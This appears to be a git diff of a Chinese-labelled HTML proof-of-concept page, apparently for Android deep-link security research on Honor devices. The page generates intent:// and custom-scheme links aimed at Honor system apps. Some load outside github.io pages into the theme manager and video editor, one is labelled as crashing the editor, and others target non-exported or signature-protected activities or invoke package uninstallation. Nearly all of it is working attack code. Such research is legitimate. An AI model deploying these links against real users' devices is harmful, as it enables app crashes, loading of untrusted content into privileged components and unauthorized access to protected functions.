@@ -1,84 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>DeepLink</title>
+</head>
 <body>
-<a href="intent://www.honor.com/theme?url=https://laisicheng.github.io/pages/thememanager_poc.html#Intent;scheme=hnt;package=com.hihonor.android.thememanager;component=com.hihonor.android.thememanager/.logic.link.ac.ThirdApiActivity;end">点击打开主题管理器</a>
-<script>
-  var json = '{"url": "https://lightpeanut.github.io/ShadowScripts/list_objects.html"}';
-  var encodedJson = encodeURIComponent(json);
-  var intentUrl = "heditor://launch.cn/todocode?cd=21001&content=" + encodedJson;
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "点击打开剪辑（com.hihonor.videoeditor）";
-  document.body.appendChild(link);
+  <!-- 保留原本的第一个静态链接：点击打开主题管理器 -->
+  <a href="intent://www.honor.com/theme?url=https://laisicheng.github.io/pages/thememanager_poc.html#Intent;scheme=hnt;package=com.hihonor.android.thememanager;component=com.hihonor.android.thememanager/.logic.link.ac.ThirdApiActivity;end">
+    点击打开主题管理器
+  </a>
 
-  var link2 = document.createElement('a');
-  var intentUrl = "heditor://launch.cn/todocode?cd=21001&content=a";
-  var link2 = document.createElement('a');
-  link2.href = intentUrl2;
-  link2.textContent = "令剪辑崩溃（com.hihonor.videoeditor）";
-  document.body.appendChild(link2);
+  <script>
+    // 1. JSON和编码
+    var jsonObj = { "url": "https://lightpeanut.github.io/ShadowScripts/list_objects.html" };
+    var json = JSON.stringify(jsonObj);
+    var encodedJson = encodeURIComponent(json);
 
+    // 2. 第一个链接：点击打开剪辑
+    var intentUrl1 = "heditor://launch.cn/todocode?cd=21001&content=" + encodedJson;
+    var link1 = document.createElement('a');
+    link1.href = intentUrl1;
+    link1.textContent = "点击打开剪辑（com.hihonor.videoeditor）";
+    document.body.appendChild(link1);
 
-  var intentUrl = "intent://contents#Intent;scheme=gamecenter;action=android.intent.action.VIEW;package=com.hihonor.gamecenter;end"
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "intentUri（com.hihonor.gamecenter）";
-  document.body.appendChild(link);
+    // 换行
+    var br1 = document.createElement('br');
+    document.body.appendChild(br1);
 
-  var intentUrl = "hnquickapp://permission_list_activity"
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "需要signature权限的intentUri（com.hihonor.quickengine）";
-  document.body.appendChild(link);
+    // 3. 第二个链接：令剪辑崩溃
+    var intentUrl2 = "heditor://launch.cn/todocode?cd=21001&content=a";
+    var link2 = document.createElement('a');
+    link2.href = intentUrl2;
+    link2.textContent = "令剪辑崩溃（com.hihonor.videoeditor）";
+    document.body.appendChild(link2);
 
-  var intentUrl = "intent://permission_list_activity#Intent;scheme=hnquickapp;action=android.intent.action.VIEW;package=com.hihonor.quickengine;end"
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "需要signature权限的intentUri（com.hihonor.quickengine2）";
-  document.body.appendChild(link);
+    var br2 = document.createElement('br');
+    document.body.appendChild(br2);
 
-  var intentUrl = "intent://anything#Intent;scheme=anything;action=org.hapjs.action.VIEW_ERROR;package=com.hihonor.quickengine;end"
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "export=false的intentUri（com.hihonor.quickengine3）";
-  document.body.appendChild(link);
+    // 4. gamecenter
+    var intentUrl3 = "intent://contents#Intent;scheme=gamecenter;action=android.intent.action.VIEW;package=com.hihonor.gamecenter;end";
+    var link3 = document.createElement('a');
+    link3.href = intentUrl3;
+    link3.textContent = "intentUri（com.hihonor.gamecenter）";
+    document.body.appendChild(link3);
 
-  var intentUrl = "intent://anything#Intent;scheme=anything;package=com.hihonor.appmarket;end"
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "export=false的intentUri（com.hihonor.appmarket）";
-  document.body.appendChild(link);
+    var br3 = document.createElement('br');
+    document.body.appendChild(br3);
 
-  var intentUrl = "intent://anything#Intent;scheme=anything;component=com.hihonor.appmarket/com.hihonor.appmarket.module.search.SearchAppActivity;end"
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "export=false的intentUri（com.hihonor.appmarket1）";
-  document.body.appendChild(link);
+    // 5. quickengine 无签名权限
+    var intentUrl4 = "hnquickapp://permission_list_activity";
+    var link4 = document.createElement('a');
+    link4.href = intentUrl4;
+    link4.textContent = "需要 signature 权限的 intentUri（com.hihonor.quickengine）";
+    document.body.appendChild(link4);
 
-  
-  var intentUrl = "intent://anything#Intent;scheme=anything;component=com.hihonor.appmarket/.module.search.SearchAppActivity;end"
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "export=false的intentUri（com.hihonor.appmarket2）";
-  document.body.appendChild(link);
+    var br4 = document.createElement('br');
+    document.body.appendChild(br4);
 
-  var intentUrl = "intent://anything#Intent;scheme=anything;component=com.hihonor.appmarket/.com.hihonor.appmarket.module.search.SearchAppActivity;end"
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "export=false的intentUri（com.hihonor.appmarket3）";
-  document.body.appendChild(link);
+    // 6. quickengine2
+    var intentUrl5 = "intent://permission_list_activity#Intent;scheme=hnquickapp;action=android.intent.action.VIEW;package=com.hihonor.quickengine;end";
+    var link5 = document.createElement('a');
+    link5.href = intentUrl5;
+    link5.textContent = "需要 signature 权限的 intentUri（com.hihonor.quickengine2）";
+    document.body.appendChild(link5);
 
-  var intentUrl = "intent://anything#Intent;scheme=anything;component=com.hihonor.controlcenter/com.hihonor.appmarket.module.search.SearchAppActivity;end"
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "export=false的intentUri（com.hihonor.controcenter）";
-  document.body.appendChild(link);
+    var br5 = document.createElement('br');
+    document.body.appendChild(br5);
 
-  
-  var intentUrl = "intent://anything#Intent;scheme=package;action=android.intent.action.UNINSTALL_PACKAGE;package=com.android.packageinstaller;end"
-  var link = document.createElement('a');
-  link.href = intentUrl;
-  link.textContent = "export=false的intentUri（com.hihonor.controcenter）";
-  document.body.appendChild(link);
+    // 7. quickengine3 export=false
+    var intentUrl6 = "intent://anything#Intent;scheme=anything;action=org.hapjs.action.VIEW_ERROR;package=com.hihonor.quickengine;end";
+    var link6 = document.createElement('a');
+    link6.href = intentUrl6;
+    link6.textContent = "export=false 的 intentUri（com.hihonor.quickengine3）";
+    document.body.appendChild(link6);
 
-  
-</script>
+    var br6 = document.createElement('br');
+    document.body.appendChild(br6);
+
+    // 8. appmarket export=false
+    var intentUrl7 = "intent://anything#Intent;scheme=anything;package=com.hihonor.appmarket;end";
+    var link7 = document.createElement('a');
+    link7.href = intentUrl7;
+    link7.textContent = "export=false 的 intentUri（com.hihonor.appmarket）";
+    document.body.appendChild(link7);
+
+    var br7 = document.createElement('br');
+    document.body.appendChild(br7);
+
+    // 9. appmarket1
+    var intentUrl8 = "intent://anything#Intent;scheme=anything;component=com.hihonor.appmarket/com.hihonor.appmarket.module.search.SearchAppActivity;end";
+    var link8 = document.createElement('a');
+    link8.href = intentUrl8;
+    link8.textContent = "export=false 的 intentUri（com.hihonor.appmarket1）";
+    document.body.appendChild(link8);
+
+    var br8 = document.createElement('br');
+    document.body.appendChild(br8);
+
+    // 10. appmarket2
+    var intentUrl9 = "intent://anything#Intent;scheme=anything;component=com.hihonor.appmarket/.module.search.SearchAppActivity;end";
+    var link9 = document.createElement('a');
+    link9.href = intentUrl9;
+    link9.textContent = "export=false 的 intentUri（com.hihonor.appmarket2）";
+    document.body.appendChild(link9);
+
+    var br9 = document.createElement('br');
+    document.body.appendChild(br9);
+
+    // 11. appmarket3
+    var intentUrl10 = "intent://anything#Intent;scheme=anything;component=com.hihonor.appmarket/.com.hihonor.appmarket.module.search.SearchAppActivity;end";
+    var link10 = document.createElement('a');
+    link10.href = intentUrl10;
+    link10.textContent = "export=false 的 intentUri（com.hihonor.appmarket3）";
+    document.body.appendChild(link10);
+
+    var br10 = document.createElement('br');
+    document.body.appendChild(br10);
+
+    // 12. controlcenter
+    var intentUrl11 = "intent://anything#Intent;scheme=anything;component=com.hihonor.controlcenter/com.hihonor.appmarket.module.search.SearchAppActivity;end";
+    var link11 = document.createElement('a');
+    link11.href = intentUrl11;
+    link11.textContent = "export=false 的 intentUri（com.hihonor.controlcenter）";
+    document.body.appendChild(link11);
+
+    var br11 = document.createElement('br');
+    document.body.appendChild(br11);
+
+    // 13. packageinstaller
+    var intentUrl12 = "intent://anything#Intent;scheme=package;action=android.intent.action.UNINSTALL_PACKAGE;package=com.android.packageinstaller;end";
+    var link12 = document.createElement('a');
+    link12.href = intentUrl12;
+    link12.textContent = "export=false 的 intentUri（com.hihonor.controcenter）";
+    document.body.appendChild(link12);
+
+  </script>
 </body>
+</html>
